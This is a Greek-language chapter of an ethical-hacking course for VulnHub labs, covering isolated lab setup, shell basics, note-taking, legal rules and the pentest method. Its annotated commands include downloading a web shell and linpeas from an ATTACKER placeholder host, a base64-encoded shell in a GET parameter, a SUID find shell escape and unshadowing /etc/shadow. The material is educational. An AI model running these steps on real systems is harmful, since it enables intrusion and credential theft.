## 1. Τι χρειάζεστε

| Στοιχείο | Ελάχιστο | Προτεινόμενο | Γιατί |
| --- | --- | --- | --- |
| **Υλικό** | 8 GB RAM, 2 πυρήνες | 16 GB RAM, 4+ πυρήνες, SSD | Θα τρέχετε 2–3 VM ταυτόχρονα |
| **Υπερ-διαχειριστής εικονικών μηχανών** | VirtualBox (δωρεάν) | VirtualBox 7.x ή VMware Workstation Player | Το VirtualBox είναι δωρεάν και όλα τα OVA του VulnHub ανοίγουν εκεί |
| **Επιθετικός** | Kali Linux 2024.x | Kali ως VM, 4 GB RAM, 2 CPU | Περιέχει **προεγκατεστημένα** τα 90% των εργαλείων αυτής της διαδρομής |
| **Θύματα** | Τα 13 OVA από το VulnHub | — | Κατεβάζετε ένα τη φορά, όχι όλα μαζί |
| **Δίκτυο εργαστηρίου** | Host-only adapter | Host-only, `192.168.56.0/24` | **Απομόνωση.** Όχι bridged, ποτέ |

### Η διαμόρφωση δικτύου που πρέπει να έχετε

```text
┌─────────────────────── Ο υπολογιστής σας ───────────────────────┐
│                                                                  │
│   ┌──────────────┐        Host-only 192.168.56.0/24             │
│   │  Kali Linux  │ 192.168.56.10 ─────────────┐                 │
│   └──────────────┘                            │                 │
│         │ NAT (έξοδος στο internet)   ┌───────┴────────┐        │
│         ▼                             │  Μηχάνημα VM   │        │
│   το κανονικό σας δίκτυο              │ 192.168.56.101 │        │
│                                       └────────────────┘        │
│                                       (μόνο host-only adapter)  │
└──────────────────────────────────────────────────────────────────┘
```

**Ο οικοδεσπότης σας έχει συνήθως τη διεύθυνση `192.168.56.1`** στο host-only δίκτυο.
Εσείς δίνετε στον Kali το `.10` και στο θύμα το `.101` και πάνω. Αυτές είναι συμβάσεις, όχι
κανόνες — αλλά **κρατήστε τις ίδιες σε όλα τα εργαστήρια**, γιατί τα walkthroughs και οι
σημειώσεις σας γίνονται πολύ πιο εύκολα.

> ### 📖 Σύνοψη — Τι είναι «δικτυακό τμήμα» και γιατί έχει σημασία
>
> Ένα **υποδίκτυο** είναι ένα σύνολο διευθύνσεων που μοιράζονται ένα κοινό πρόθεμα. Το
> `192.168.56.0/24` σημαίνει: οι πρώτοι **24** bit είναι το δίκτυο (`192.168.56`) και οι
> υπόλοιποι 8 είναι ο ξενιστής — άρα 2⁸ = 256 διευθύνσεις, από `.0` έως `.255`. Η `.0` είναι η
> διεύθυνση δικτύου, η `.255` η διεύθυνση εκπομπής (broadcast), και η `.1` συνήθως η πύλη.
> **Χρήσιμες: `.2` έως `.254`.**

### Ελέγξτε το δίκτυο πριν κατηγορήσετε τα εργαλεία σας

```bash
ip -br a          # ποιες διεπαφές υπάρχουν και ποιες διευθύνσεις έχουν;
```

```text
lo               UNKNOWN        127.0.0.1/8
eth0             UP             10.0.2.15/24            ← NAT, αγνοήστε αυτήν
eth1             UP             192.168.56.10/24        ← host-only: ΑΥΤΗ είναι η διεπαφή του εργαστηρίου σας
```

> **Πώς να το διαβάσετε:** `-br` σημαίνει *brief* (συνοπτικά). Κάθε γραμμή είναι μία διεπαφή. Αυτή στο `192.168.56.0/24` είναι το εργαστήριό σας. **Κάθε σάρωση, ακροατής (listener) και reverse shell πρέπει να χρησιμοποιεί αυτήν τη διεύθυνση** — όχι το `127.0.0.1`, και όχι τη διεύθυνση NAT. Αν το μπερδέψετε, τα reverse shells δεν συνδέονται ποτέ χωρίς κανένα μήνυμα λάθους.

## 2. Στιγμιότυπα (snapshots): η συνήθεια που κάνει τον πειραματισμό δωρεάν

Πάρτε snapshot κάθε θύματος **αμέσως μετά την πρώτη εκκίνηση, πριν το επιτεθείτε**, και ένα
ακόμη του Kali όταν το ρυθμίσετε.

Γιατί μετράει περισσότερο απ' όσο ακούγεται: αυτά τα μηχανήματα είναι **με κατάσταση**. Αν
αντικαταστήσετε το `/etc/passwd`, καταστρέψετε μια βάση MySQL, ή γεμίσετε έναν δίσκο με μια
αδέσποτη διεργασία, το μηχάνημα μπορεί να πάψει να συμπεριφέρεται όπως περιγράφει το
walkthrough — και θα περάσετε ένα βράδυ διορθώνοντας κάτι που δεν ήταν ποτέ δικό σας λάθος. Ένα
snapshot το μετατρέπει σε rewind δέκα δευτερολέπτων.

Αλλάζει και τον τρόπο που δουλεύετε. Όταν η επαναφορά είναι δωρεάν, δοκιμάζετε το ριψοκίνδυνο:
το kernel exploit που μπορεί να «παγώσει» το VM, τη μεταφόρτωση που μπορεί να σπάσει την
εφαρμογή, το `rm` σε κατάλογο για τον οποίο δεν είστε σίγουροι. **Όσοι δεν έχουν snapshots είναι
δειλοί, και οι δειλοί μαθαίνουν αργά.**

```text
VirtualBox → δεξί κλικ στο VM → Snapshots → Take
  Name:   "clean boot"
  Επίσης: πάρτε "after recon" μόλις μάθετε την IP και τις ανοιχτές θύρες
```

## 3. Τα βασικά του τερματικού — όσα χρειάζεστε πραγματικά

Δεν χρειάζεται να γίνετε χειριστής του bash. Χρειάζεστε **αυτά τα δέκα πράγματα**.

### 3.1 Η ανατομία της γραμμής εντολών

```bash
sudo nmap -sV -p 80,443 --script=http-title -oN scan.txt 192.168.56.101
└─┬─┘ └┬─┘ └──────────────┬─────────────────────────┘ └─────┬─────┘
 εντολή όρισμα      επιλογές/παράμετροι                    στόχος
με δικαίωμα
root
```

| Μέρος | Τι είναι | Παράδειγμα |
| --- | --- | --- |
| **Εντολή** | Το πρόγραμμα που τρέχει | `nmap` |
| **Επιλογές (flags)** | Αρχίζουν με `-` (μία παύλα, ένα γράμμα) ή `--` (δύο, λέξη) | `-sV`, `--script` |
| **Τιμή επιλογής** | Αυτό που ακολουθεί την επιλογή | `-p 80,443` |
| **Θέση-ορίσματα** | Δεν έχουν παύλα· συνήθως ο στόχος | `192.168.56.101` |
| **`sudo`** | «τρέξε το ως root» | Χρειάζεται για δίκτυο χαμηλού επιπέδου (θ. 1–1023) |

### 3.2 Οι δέκα συντομεύσεις που σώζουν ώρες

| Πλήκτρα | Τι κάνουν | Πότε |
| --- | --- | --- |
| `Tab` | Συμπληρώνει όνομα αρχείου/εντολής | Πάντα. Δύο φορές = λίστα επιλογών |
| `Ctrl+C` | Σκοτώνει την τρέχουσα εντολή | Όταν κάτι κρέμασε |
| `Ctrl+L` | Καθαρίζει την οθόνη | Ισοδύναμο του `clear` |
| `Ctrl+R` | **Αναζήτηση προς τα πίσω στο ιστορικό** | Πληκτρολογείτε `nmap` και βρίσκει την τελευταία |
| `Ctrl+D` | Τέλος εισόδου / έξοδος | Ισοδύναμο του `exit` |
| `Ctrl+Z` | Αναστολή (suspend) | Χρειάζεται για την αναβάθμιση TTY |
| `↑` / `↓` | Ιστορικό | — |
| `!!` | Η προηγούμενη εντολή | `sudo !!` = τρέξε ξανά ως root |
| `!$` | Το τελευταίο όρισμα | `mkdir scans && cd !$` |
| `Ctrl+Shift+C/V` | Αντιγραφή/επικόλληση σε τερματικό | Όχι το `Ctrl+C` — αυτό σκοτώνει |

### 3.3 Ανακατεύθυνση και σωληνώσεις

Αυτά τα δύο σύμβολα είναι η διαφορά μεταξύ «ξέρω τερματικό» και «παλεύω με το τερματικό».

```bash
nmap -p- 192.168.56.101 > allports.txt        # stdout → αρχείο (αντικατάσταση)
nmap -sV -p 22,80 target >> notes.txt         # stdout → αρχείο (προσθήκη)
nmap -sC target > out.txt 2>&1                 # stdout ΚΑΙ stderr → αρχείο
grep -i admin notes.txt | wc -l                # σωλήνωση: το αποτέλεσμα του grep → wc
cat scan.txt | grep open | sort -u             # αλυσίδα τριών
```

| Σύμβολο | Όνομα | Τι κάνει |
| --- | --- | --- |
| `>` | Ανακατεύθυνση εξόδου | Γράφει το stdout σε αρχείο, **αντικαθιστώντας** το |
| `>>` | Προσάρτηση | Γράφει το stdout στο τέλος του αρχείου |
| `2>` | Ανακατεύθυνση σφαλμάτων | Το **stderr** (ροή 2) σε αρχείο |
| `2>&1` | «τα σφάλματα μαζί με το κανονικό» | Ροή 2 → εκεί που πάει η ροή 1 |
| `\|` | Σωλήνωση | Το stdout του αριστερού γίνεται stdin του δεξιού |
| `<` | Είσοδος από αρχείο | Σπάνιο στα εργαλεία ασφαλείας |

> **Η σειρά έχει σημασία.** `nmap target > out.txt 2>&1` πιάνει και τα σφάλματα.
> `nmap target 2>&1 > out.txt` **δεν** τα πιάνει — γιατί τη στιγμή που γράφετε `2>&1`, η ροή 1
> δείχνει ακόμα στην οθόνη, και μόνο *μετά* την αλλάζετε σε αρχείο. Αυτή η λεπτομέρεια
> μπερδεύει ακόμα και έμπειρους χρήστες.

## 4. Πώς να κρατάτε σημειώσεις

Δύο αρχεία ανά μηχάνημα, σε απλό Markdown:

```text
notes/
├── machine-01-basic-pentesting/
│   ├── timeline.md      # τι έκανα, πότε, τι είδα
│   └── report.md        # η αναφορά μιας σελίδας
└── machine-02-cybersploit/
    ├── timeline.md
    └── report.md
```

**`timeline.md`** — ωρολόγιο, με αποτέλεσμα και σκέψη:

```markdown
## 2024-05-11 09:40 — Αναγνώριση
- `sudo nmap -sC -sV -p- 192.168.56.101` → 4 θύρες ανοιχτές: 21, 22, 8009, 8080
- ProFTPD **1.3.3c** — αυτή η έκδοση μου φαίνεται ύποπτη, θα την ψάξω
- 09:52 — `searchsploit -t proftpd 1.3.3` → **backdoor command execution**. Δεν είναι bug,
  είναι εσκεμμένα τοποθετημένο backdoor από το 2010.
```

**`report.md`** — το προϊόν. Δομή:

```markdown
# Αναφορά — <όνομα μηχανήματος>
**Ημερομηνία:** …  **Στόχος:** 192.168.56.101  **Επιθετικός:** 192.168.56.10

## Περίληψη διαχείρισης
Τρεις προτάσεις σε απλή γλώσσα. Τι βρέθηκε, πόσο σοβαρό, τι πρέπει να γίνει.

## Ευρήματα
| # | Ευπάθεια | Σοβαρότητα | Απόδειξη | Διόρθωση |

## Αλυσίδα εκμετάλλευσης
Αναγνώριση → Απαρίθμηση → Πρόσβαση → Αναβάθμιση → Σημαία. Με εντολές.

## Παρατηρήσεις άμυνας
Τι θα έβλεπε μια ομάδα μπλε σε πραγματικό χρόνο.
```

**Γιατί αξίζει τον κόπο.** Στην πραγματική δουλειά, η αναφορά **είναι** το προϊόν. Ο πελάτης
δεν πληρώνει για το root shell· πληρώνει για το έγγραφο που λέει στον διαχειριστή τι να
διορθώσει. Αν μπορείτε να εξηγήσετε μια ευπάθεια σε έναν μη τεχνικό διευθυντή και να δώσετε
μια συγκεκριμένη διόρθωση στον μηχανικό, έχετε τη δουλειά.

## 5. Οι τέσσερις κανόνες

1. **Επιτίθεστε μόνο σε μηχανήματα που κατεβάσατε εσείς.** Οποιαδήποτε άλλη περίπτωση είναι
   ποινικό αδίκημα (Ν. 2472/1997 για τα προσωπικά δεδομένα, Ν. 4411/2016 που κυρώνει τη
   Σύμβαση της Βουδαπέστης, και η Οδηγία 2013/40/ΕΕ για τις επιθέσεις σε συστήματα
   πληροφοριών). Το «ήταν απλώς άνοιγμα στη θύρα» δεν είναι άμυνα.
2. **Το εργαστήριο είναι απομονωμένο.** Host-only ή internal network. Αν το θύμα έχει
   πρόσβαση στο πραγματικό σας δίκτυο, ένα σφάλμα σε exploit μπορεί να χτυπήσει τον router
   σας, τον εκτυπωτή σας, ή το laptop της δουλειάς σας.
3. **Καταγράφετε τα πάντα.** Χρονολόγιο με εντολές, αποτέλεσμα, και σκέψη. Θα το χρειαστείτε
   για την αναφορά, και θα το χρειαστείτε όταν κάτι δουλεύει στο μηχάνημα 7 και δεν θυμάστε
   γιατί.
4. **Αν δεν καταλαβαίνετε, σταματάτε.** Το αντίγραφο-επικόλληση χωρίς κατανόηση παράγει
   ανθρώπους που μπορούν να χακάρουν μόνο μηχανήματα που έχουν ξαναδεί.

## 6. Η μέθοδος — πέντε στάδια, πάντα με την ίδια σειρά

```text
  1. ΑΝΑΓΝΩΡΙΣΗ          2. ΑΠΑΡΙΘΜΗΣΗ        3. ΕΚΜΕΤΑΛΛΕΥΣΗ
  «τι υπάρχει;»    →     «τι τρέχει και       «πώς μπαίνω μέσα;»
   IP, MAC, ζωντανοί      ποια έκδοση;»
   ξενιστές              θύρες, υπηρεσίες,
                         εκδόσεις, CMS, χρήστες

           5. ΑΝΑΦΟΡΑ &          4. ΑΝΑΒΑΘΜΙΣΗ ΠΡΟΝΟΜΙΩΝ
           ΚΑΘΑΡΙΣΜΟΣ    ←       & ΜΕΤΑ-ΕΚΜΕΤΑΛΛΕΥΣΗ
           τι βρήκα, πώς         «πώς γίνομαι root;»
           διορθώνεται           sudo, SUID, capabilities,
                                 cron, kernel
```

### Τι σημαίνει πραγματικά κάθε στάδιο

**1. Αναγνώριση (Reconnaissance).** Η εύρεση *της ύπαρξης* ενός στόχου. Στο εργαστήριο: ποια
IP είναι ζωντανά στο δίκτυό μου. Σε πραγματικό έργο: υποτομείς, διευθύνσεις IP που ανήκουν
στην εταιρεία, διαρροές σε βάσεις δεδομένων, εργαζόμενοι στο LinkedIn, τεχνολογίες που
χρησιμοποιεί το site. **Δεν στέλνετε σχεδόν τίποτα στον στόχο ακόμα** — ψάχνετε γύρω του.

**2. Απαρίθμηση (Enumeration).** Τώρα *μιλάτε* στον στόχο. Ποιες θύρες απαντούν; Ποια
υπηρεσία και ποια **έκδοση** τρέχει σε κάθε θύρα; Ποιο CMS; Ποιοι χρήστες υπάρχουν; Ποια
ονόματα αρχείων επιστρέφουν 200; **Η απαρίθμηση είναι το 80% της δουλειάς.** Σχεδόν κάθε
επιτυχία σε αυτή τη διαδρομή προέρχεται από καλύτερη απαρίθμηση, όχι από πιο έξυπνο exploit.

**3. Εκμετάλλευση (Exploitation).** Η χρήση μιας ευπάθειας για πρόσβαση. Σπάνια είναι κάτι
εξωτικό· συνήθως είναι μια παλιά έκδοση με δημοσιευμένο exploit, ή μια προεπιλεγμένη ρύθμιση,
ή ένας αδύναμος κωδικός.

**4. Αναβάθμιση προνομίων (Privilege escalation).** Μπήκατε, αλλά ως `www-data` — ένας
ανώνυμος λογαριασμός υπηρεσίας χωρίς δικαιώματα. Τώρα ψάχνετε για λάθος ρυθμίσεις: `sudo`,
SUID, capabilities, cron, εγγράψιμα αρχεία, ξεπερασμένος kernel.

**5. Αναφορά και καθαρισμός.** Τι αφήσατε πίσω; Τι ανεβάσατε; Τι διαγράψατε; Σε πραγματικό
έργο αυτό λέγεται **αποκατάσταση** και είναι συμβατική υποχρέωση.

## 7. Έλεγχος γνώσεων

Απαντήστε χωρίς να κοιτάξετε. Αν δυσκολευτείτε, ξαναδιαβάστε την αντίστοιχη ενότητα.

<details>
<summary><b>1.</b> Τι σημαίνει <code>192.168.56.0/24</code> και πόσες χρήσιμες διευθύνσεις δίνει;</summary>

Οι πρώτοι 24 bit είναι το πρόθεμα δικτύου (`192.168.56`), οι υπόλοιποι 8 bit ο ξενιστής.
2⁸ = **256** διευθύνσεις (`.0`–`.255`), από τις οποίες η `.0` είναι η διεύθυνση δικτύου και η
`.255` η διεύθυνση broadcast, άρα **254 χρήσιμες**.
</details>

<details>
<summary><b>2.</b> Ποια η διαφορά μεταξύ <code>></code> και <code>>></code>;</summary>

`>` **αντικαθιστά** το περιεχόμενο του αρχείου· `>>` **προσαρτά** στο τέλος. Το `>` είναι
επικίνδυνο γιατί χάνετε δεδομένα χωρίς προειδοποίηση.
</details>

<details>
<summary><b>3.</b> Γιατί το <code>cmd > out.txt 2>&1</code> πιάνει τα σφάλματα αλλά το <code>cmd 2>&1 > out.txt</code> όχι;</summary>

Γιατί η ανακατεύθυνση γίνεται **αριστερά προς δεξιά**. Στην πρώτη μορφή η ροή 1 πάει πρώτα
στο αρχείο και *μετά* η ροή 2 αντιγράφει τον προορισμό της ροής 1 (το αρχείο). Στη δεύτερη,
τη στιγμή που η ροή 2 αντιγράφει τη ροή 1, αυτή δείχνει ακόμα στην οθόνη.
</details>

<details>
<summary><b>4.</b> Ποια είναι τα πέντε στάδια και πού «μιλάτε» πραγματικά στον στόχο;</summary>

Αναγνώριση → Απαρίθμηση → Εκμετάλλευση → Αναβάθμιση προνομίων → Αναφορά/καθαρισμός. Η
αναγνώριση γίνεται **γύρω** από τον στόχο (αρχεία, υπηρεσίες καταγραφής, πηγές τρίτων)· από
την απαρίθμηση και μετά στέλνετε πακέτα **στον** στόχο και φαίνεστε στα αρχεία του.
</details>

<details>
<summary><b>5.</b> Γιατί το εργαστήριο πρέπει να είναι host-only και όχι bridged;</summary>

Σε bridged δίκτυο το θύμα είναι μέλος του πραγματικού σας δικτύου: μπορεί να δεχτεί
σαρώσεις από εσάς αλλά και **να στείλει προς τα έξω** (reverse shell σε λανθασμένη διεύθυνση,
worm, ARP poisoning), και να δει τα υπόλοιπα μηχανήματά σας. Το host-only δημιουργεί
απομονωμένο δίκτυο μεταξύ ξενιστή και VM μόνο.
</details>

## 9. Σημειωμένες εντολές

Κάθε εντολή που χρησιμοποιείται σε αυτό το κεφάλαιο, με την είσοδο αναλυμένη όρο προς όρο,
το πραγματικό αποτέλεσμα, και ανάγνωση γραμμή προς γραμμή.

### 9.1 Η ανάγνωση του prompt και η ανατομία μιας γραμμής εντολών

```text
kali@kali:~/Cybersecurity101-Labs$ sudo nmap -sV -p- 192.168.56.104 > scan.txt 2>&1 | tee -a log.txt
```

| Μέρος | Σημασία |
| --- | --- |
| `kali@kali` | **user@host** |
| `~/Cybersecurity101-Labs` | ο τρέχων κατάλογος, με `~` = το home σας |
| **`$`** | είστε **απλός χρήστης**. Το **`#`** θα σήμαινε root. Αυτός ο ένας χαρακτήρας είναι ο γρηγορότερος έλεγχος προσανατολισμού |
| `sudo` | τρέξε την επόμενη εντολή ως root (μετά από πιστοποίηση) |
| `nmap` | το πρόγραμμα — λύνεται ψάχνοντας το `$PATH` από αριστερά |
| `-sV -p-` | **επιλογές**: αλλάζουν τη συμπεριφορά. `-p-` = «όλες οι θύρες» |
| `192.168.56.104` | το **όρισμα**: σε τι ενεργεί |
| `> scan.txt` | ανακατεύθυνση **stdout** (fd 1) σε αρχείο, **αντικαθιστώντας** το |
| `2>&1` | ανακατεύθυνση **stderr** (fd 2) εκεί που δείχνει τώρα το fd 1 |
| `\| tee -a log.txt` | σωλήνωση του stdout στο `tee`, που γράφει **και** σε αρχείο **και** στην οθόνη (`-a` προσθέτει) |

**Η σειρά έχει σημασία στην ανακατεύθυνση.** `command > file 2>&1` πιάνει και τις δύο ροές.
`command 2>&1 > file` πιάνει μόνο το stdout, γιατί το `2>&1` αξιολογείται *πριν* το `>` μετακινήσει
το fd 1 — το stderr δείχνει ακόμα στο τερματικό. Αυτό μπερδεύει όλους μία φορά.

**Ο ίδιος λόγος που το `sudo echo x >> /etc/passwd` αποτυγχάνει:** το κέλυφος εκτελεί την
ανακατεύθυνση `>>` *πριν* τρέξει η `sudo`, άρα η εγγραφή επιχειρείται από το μη προνομιούχο κέλυφός
σας. Χρησιμοποιήστε `echo x | sudo tee -a /etc/passwd`, που μετακινεί την εγγραφή μέσα στην
προνομιούχο διεργασία.

### 9.2 Πλοήγηση και καταγραφή

```bash
pwd
ls -la /etc
cd /var/www/html && ls
cd - && cd ..
```

```text
/var/www/html
total 68
drwxr-xr-x  4 root root  4096 May 11 09:12 .
drwxr-xr-x 14 root root  4096 May 11 09:12 ..
-rw-r--r--  1 root root 10701 Dec  7  2017 index.html
-rw-r--r--  1 root root    41 Dec  7  2017 robots.txt
drwxr-xr-x  3 root root  4096 Dec  7  2017 secret
-rw-r-----  1 root root   227 Dec  7  2017 .htpasswd
lrwxrwxrwx  1 root root    11 Dec  7  2017 config -> /etc/app.cfg
```

| Επιλογή | Σημασία |
| --- | --- |
| `-l` | **long**: δικαιώματα, σύνδεσμοι, ιδιοκτήτης, ομάδα, μέγεθος, ημερομηνία, όνομα |
| `-a` | **all**: και οι καταχωρήσεις που αρχίζουν με `.` |
| `-h` | μεγέθη αναγνώσιμα (`4.0K`, `12M`) |
| `-t` | ταξινόμηση κατά χρόνο τροποποίησης, νεότερα πρώτα — **εξαιρετικό για το τι άλλαξε πρόσφατα** |
| `-r` | αντιστροφή ταξινόμησης |
| `-R` | αναδρομή σε υποκαταλόγους |
| `-i` | αριθμοί inode — δύο ονόματα με ίδιο inode είναι hard links στο ίδιο αρχείο |

**Διαβάστε πρώτα τον χαρακτήρα τύπου.** `d` = κατάλογος, `-` = κανονικό αρχείο, **`l` = συμβολικός
σύνδεσμος**, `s` = socket, `p` = named pipe, `b`/`c` = block/character συσκευή. Το `config ->
/etc/app.cfg` λέει ότι το πραγματικό αρχείο είναι στο `/etc`, συχνά έξω από το web root και άρα μη
άμεσα κατεβάσιμο — διάκριση που καθορίζει αν ένα LFI είναι χρήσιμο.

**Το `-a` δεν είναι προαιρετικό όταν κυνηγάτε.** `.htpasswd`, `.env`, `.git/`, `.bash_history`,
`.ssh/` — τα ενδιαφέροντα αρχεία κρύβονται κατά σύμβαση, και η σύμβαση είναι ακριβώς εκεί που βάζουν
πράγματα οι συγγραφείς CTF και οι απρόσεκτοι διαχειριστές. Το `total 68` είναι άθροισμα blocks, **όχι**
άθροισμα μεγεθών αρχείων.

Το `cd -` επιστρέφει στον **προηγούμενο** κατάλογο, το `cd ..` ανεβαίνει ένα επίπεδο, το `cd` σκέτο
πάει στο home, και το `&&` αλυσιδώνει εντολές ώστε η δεύτερη να τρέξει μόνο αν πέτυχε η πρώτη.

### 9.3 Ανάγνωση αρχείων χωρίς να τα καταστρέψετε

```bash
cat /etc/hostname
head -20 /etc/passwd
tail -f /var/log/auth.log
less /var/www/html/index.php
grep -rniE 'password|secret|api_key' /var/www/html/ | head -20
wc -l fsocity.dic
```

| Εντολή | Σημασία |
| --- | --- |
| `cat FILE` | τύπωσε όλο το αρχείο. Καλό για σύντομα· άχρηστο για 14 εκατομμύρια γραμμές |
| `head -n FILE` | πρώτες *n* γραμμές (`-20` = `-n 20`) |
| `tail -n FILE` | τελευταίες *n*. **`tail -n +2`** = «ξεκίνα από τη γραμμή 2» (παράλειψε την πρώτη) — χρησιμοποιείται στο Μηχάνημα 13 για να πετάξει τη γραμμή του root από το `/etc/shadow` |
| `tail -f FILE` | **follow**: τύπωνε καθώς το αρχείο μεγαλώνει. Ιδανικό για παρακολούθηση log όσο επιτίθεστε |
| `less FILE` | σελιδοποίηση. **Χρησιμοποιείτε `less`, ποτέ `more`**: `/` αναζήτηση μπροστά, `?` πίσω, `n` επόμενο, `G` τέλος, `g` αρχή, `-N` αριθμοί γραμμών, `!CMD` τρέχει εντολή κελύφους (και είναι vector αναβάθμισης), `q` έξοδος |
| `wc -l` | μέτρησε γραμμές · `wc -c` bytes · `wc -w` λέξεις |
| `strings -n 6 FILE` | τύπωσε ακολουθίες ≥6 εκτυπώσιμων χαρακτήρων από binary |
| `file FILE` | αναγνώρισε τον τύπο από το περιεχόμενο, όχι από την κατάληξη |
| `od -An -tx1 FILE` | hex dump (`xxd` συχνά λείπει· το `od` υπάρχει πάντα) |

**Το `grep` είναι το εργαλείο που θα χρησιμοποιήσετε περισσότερο, άρα μάθετε τις επιλογές του:**

| Επιλογή | Σημασία |
| --- | --- |
| `-r` | **recursive** σε όλο το δέντρο καταλόγων |
| `-n` | τύπωσε τον **αριθμό γραμμής** — ουσιαστικό για να παραθέτεις απόδειξη |
| `-i` | **ignore case**. `Password`, `PASSWORD`, `password` ταιριάζουν όλα |
| `-E` | **extended** regex, ώστε `\|`, `+`, `?`, `()` να δουλεύουν χωρίς backslashes |
| `-v` | **invert**: τύπωσε τις γραμμές που **δεν** ταιριάζουν. `grep -v nologin /etc/passwd` δείχνει λογαριασμούς που μπορούν να συνδεθούν |
| `-c` | τύπωσε μόνο **πλήθος** |
| `-l` | τύπωσε μόνο **ονόματα αρχείων** που ταίριαξαν |
| `-A n` / `-B n` / `-C n` | *n* γραμμές **After** / **Before** / **Context** γύρω από κάθε ταίριασμα |
| `-o` | τύπωσε μόνο το τμήμα που ταίριαξε, όχι όλη τη γραμμή |

```text
$ grep -rniE 'password|secret' /var/www/sites/default/settings.php
12:  'password' => 'R0ck3t',
```

Το `12:` είναι ο αριθμός γραμμής, ώστε να το παραθέσετε με ακρίβεια σε αναφορά: *διαπιστευτήρια σε
plaintext στο `settings.php` γραμμή 12.* Αυτή είναι η διαφορά μεταξύ «βρήκα έναν κωδικό» και ενός
αξιοποιήσιμου ευρήματος.

**Το `grep -A6` στην πράξη** — το Μηχάνημα 3 χρησιμοποιεί `grep -A6 databases` για να τυπώσει το
ταίριασμα και τις έξι επόμενες γραμμές, που είναι ακριβώς το σχήμα ενός PHP array. Όταν δεν ξέρετε
πόσες γραμμές πιάνει ένα μπλοκ, το `-A`/`-C` νικά το να τρέξετε την εντολή πέντε φορές.

### 9.4 Δικαιώματα

```bash
ls -l /opt/md5check.py
chmod 600 /home/user/.ssh/authorized_keys
chmod u+s /usr/local/bin/find
chmod -R go-w /var/www
chown root:root /etc/passwd
id
stat /etc/shadow
```

```text
-rwxrwxrwx 1 root root 1024 Apr 30  2020 /opt/md5check.py
```

**Τα bits δικαιωμάτων γράφονται πάντα με δύο τρόπους**, και πρέπει να είστε άνετοι και στους δύο:

| Συμβολικά | Οκταδικά | Σημασία |
| --- | --- | --- |
| `rwxrwxrwx` | **777** | όλοι διαβάζουν, γράφουν, εκτελούν — το world-writable root cron script του Μηχανήματος 9 |
| `rwxr-xr-x` | **755** | ο ιδιοκτήτης τα πάντα· οι άλλοι ανάγνωση+εκτέλεση. Κανονικό για καταλόγους/scripts |
| `rw-r--r--` | **644** | ιδιοκτήτης εγγραφή, άλλοι ανάγνωση. Κανονικό για αρχεία — και το **σωστό** για το `/etc/passwd` |
| `rw-------` | **600** | μόνο ο ιδιοκτήτης. Σωστό για ιδιωτικά κλειδιά και `authorized_keys` |
| `-rwsr-xr-x` | **4755** | 755 **συν το SUID bit** (το `s` αντικαθιστά το `x` του ιδιοκτήτη) |
| `r--r-----` | **440** | μόνο ανάγνωση για ιδιοκτήτη και ομάδα — σωστό για το `/etc/sudoers` |

Τα οκταδικά ψηφία είναι απλώς `r=4, w=2, x=1` αθροισμένα ανά τριάδα: ιδιοκτήτης, ομάδα, άλλοι.
`7 = 4+2+1`, `5 = 4+1`, `6 = 4+2`. Το SUID bit είναι `4000`, SGID `2000`, sticky `1000` — γι' αυτό
το `find -perm -4000` σημαίνει «έχει το SUID bit».

| Εντολή | Σημασία |
| --- | --- |
| `chmod 600 FILE` | απόλυτα δικαιώματα |
| `chmod u+s` / `g+s` / `o+w` | **συμβολικά**: πρόσθεσε SUID για τον χρήστη, SGID για την ομάδα, εγγραφή για τους άλλους |
| `chmod -R` | αναδρομή σε καταλόγους |
| `chmod go-w` | αφαίρεσε την εγγραφή από ομάδα και άλλους — η διόρθωση για χαλαρό `authorized_keys` |
| `chown user:group FILE` | αλλαγή ιδιοκτήτη και ομάδας |
| `stat FILE` | ό,τι δείχνει το `ls -l`, συν **access, modify, change** χρόνους και το inode. Το `Change:` (ctime) δεν ορίζεται από χρήστη, άρα είναι το timestamp που επιβιώνει αν κάποιος προσπαθήσει να κρύψει τα ίχνη με `touch -d` |

### 9.5 Εύρεση αρχείων

```bash
find / -name '*.php' -type f 2>/dev/null | head -20
find /var/www -newer /etc/hostname -type f
find / -perm -4000 -type f 2>/dev/null
find /etc -writable -type f 2>/dev/null
find . -exec /bin/sh \; -quit
```

| Στοιχείο | Σημασία |
| --- | --- |
| `/` | από πού ξεκινά. `.` = ο τρέχων κατάλογος |
| `-name '*.php'` | ταίριασμα ονόματος. **Βάλτε το μοτίβο σε εισαγωγικά** — χωρίς αυτά το κέλυφος επεκτείνει το `*.php` στον *τρέχοντα* κατάλογο πριν το δει η `find` |
| `-iname` | `-name` χωρίς διάκριση πεζών/κεφαλαίων |
| `-type f` | μόνο κανονικά αρχεία (`d` κατάλογοι, `l` σύνδεσμοι) |
| `-perm -4000` | δικαιώματα που περιλαμβάνουν τουλάχιστον αυτά τα bits — η αναζήτηση SUID |
| `-writable` | αρχεία που μπορείτε να γράψετε, βάσει UID, ομάδων και ACLs |
| `-newer FILE` | τροποποιήθηκε μετά το FILE — εξαιρετικό για «ό,τι άλλαξε από τότε που ήρθα» |
| `-size +10M` | μεγαλύτερο από 10 MB |
| `-mtime -1` | τροποποιήθηκε μέσα στο τελευταίο 24ωρο |
| `-not -path '/proc/*'` | εξαίρεση υποδέντρου |
| `-exec CMD {} \;` | τρέξε το CMD σε κάθε αποτέλεσμα, `{}` = το όνομα, `\;` τερματισμός (escaped ώστε το κέλυφος να μη «φάει» το ερωτηματικό) |
| `-quit` | σταμάτα στο πρώτο ταίριασμα — πώς παίρνετε *ένα* κέλυφος από `find . -exec /bin/sh \; -quit` αντί ένα ανά κατάλογο |
| `2>/dev/null` | πέτα τα εκατοντάδες `Permission denied` που βγάζει η `find` ως απλός χρήστης |

### 9.6 Σωληνώσεις, ανακατεύθυνση και μεταφορά αρχείων

```bash
nmap -sV TARGET | grep open
sort -u fsocity.dic | wc -l
cat /etc/passwd /etc/shadow | unshadow /etc/passwd /etc/shadow > combined.txt
python3 -m http.server 8000                 # ATTACKER
wget http://ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh   # TARGET
curl -o shell.php http://ATTACKER:8000/shell.php
base64 -w 0 shell.php                       # μετά επικόλληση σε GET παράμετρο
```

| Στοιχείο | Σημασία |
| --- | --- |
| `\|` | σωλήνωση: το stdout του αριστερού → stdin του δεξιού. **Ο πιο χρήσιμος χαρακτήρας στο Unix** |
| `>` | γράψε το stdout σε αρχείο, **μηδενίζοντάς** το πρώτα |
| `>>` | **προσάρτηση** |
| `2>` | ανακατεύθυνση stderr · `2>&1` στείλε το stderr όπου πάει το stdout · `&>/dev/null` πέτα και τα δύο |
